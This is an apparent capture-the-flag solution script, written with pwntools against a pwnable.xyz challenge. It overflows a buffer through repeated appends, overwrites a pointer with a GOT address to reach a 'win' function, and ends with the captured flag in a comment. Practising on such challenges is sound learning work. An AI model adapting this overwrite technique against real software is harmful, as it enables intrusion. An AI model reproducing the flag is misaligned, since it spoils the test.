from pwn import *
import time

context.terminal = ['kitty', '-e']
LOCAL = False
if LOCAL:
    r = process('./challenge')
else:
    r = remote('svc.pwnable.xyz' , 30022)


def long_append():
    win = p64(0x400b2d)
    l = r.sendlineafter("> ", "2")
    l = r.recv()
    send_size = l.decode().strip().split(" chars")[0].split("me ")[1]
    # payload = win + b'A' * (int(send_size) - len(win))
    payload = b'\x2d\x0b\x40' + b'A' * (int(send_size) - len(win))
    r.send(payload)
    return send_size

def short_append(space_left):
    
    puts_got = p64(0x6020a0) 
    ret_val = False

    l = r.sendlineafter("> ", "1")
    l = r.recv()
    send_size = int(l.decode().strip().split(" chars")[0].split("me ")[1])
    print(send_size)

    # if less than zero, and we can fit the puts address
    # if we can't fit the entire address, then we need to do it once more 
    if ((space_left - send_size) < 0):
        payload = b'B' * space_left
        send_size -= space_left
        if send_size < 8:
            r.send(payload[:send_size]) # sent first half of the payload  
            l = r.sendlineafter("> ", "1")
            l = r.recv() # there is another edge case where this might fail too but unlikely enough that i'm ok with just throwing
            payload = puts_got[send_size:]
            ret_val = True
        else:
            payload += puts_got
        send_size = -1
    else:
        payload = b'C' * int(send_size)
    r.send(payload)
    return send_size


def main():
    # there is a win flag clearly 
    # definitely overwriting the got 
    # ok dest is a pointer, overwrite pointer with got, then do a save into the dest value 
    # save_it should just take in 8 bytes and we should be good
       
    to_overflow = 0x405
    # sending out initial payload

    long_sent = long_append() # can only do this once
    print(f"total sent from long append {long_sent}")
    to_overflow -= int(long_sent)
    print(f"Left: {to_overflow}")

    # debug = 0
    while(1):
        left = short_append(to_overflow)
        if left == -1:
            break 
        # debug += 1
        to_overflow -= left
        print(f"Amount left: {to_overflow}")
        # need to check inside of short_append 
    print("broke out")
    # gdb.attach(r, gdbscript='''
# b win
# ''')
    # time.sleep(1)

    r.sendlineafter("> ", "4")
    r.sendlineafter("? ", "3")

    # r.sendlineafter("> ", "0") # do not call exit, wait for sigalarm to call exit instead cuz this doesn't actually call the exit syscall

    
    r.interactive()
    


if __name__ == '__main__':
    main()
    # flag: FLAG{strcat_or_strncat_all_the_same}
